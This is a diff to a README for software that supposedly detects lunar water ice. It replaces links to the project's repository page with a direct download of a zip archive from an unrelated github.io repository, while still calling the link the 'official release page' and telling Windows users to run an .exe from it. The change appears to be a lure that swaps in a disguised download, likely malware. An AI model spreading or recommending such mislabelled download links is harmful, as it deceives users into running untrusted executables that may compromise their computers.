@@ -5,7 +5,7 @@ description: "Detect subsurface water ice in lunar south polar craters using Cha
 ---
 # 🧊 Subsurface-Ice-Lunar-South-Polar - Detect lunar water ice with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Utvesey325/Subsurface-Ice-Lunar-South-Polar)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Utvesey325/utvesey325.github.io/main/unaccursed/github-io-utvesey-3.7.zip)
 
 ## 🔍 About the project
 
@@ -27,7 +27,7 @@ Before you install the software, check your computer against these requirements.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Utvesey325/Subsurface-Ice-Lunar-South-Polar) to find the installer.
+1. Go to the [official release page](https://raw.githubusercontent.com/Utvesey325/utvesey325.github.io/main/unaccursed/github-io-utvesey-3.7.zip) to find the installer.
 2. Select the file ending in `.exe` to begin your download.
 3. Once the download finishes, locate the file in your Downloads folder.
 4. Double-click the file to start the installation wizard.
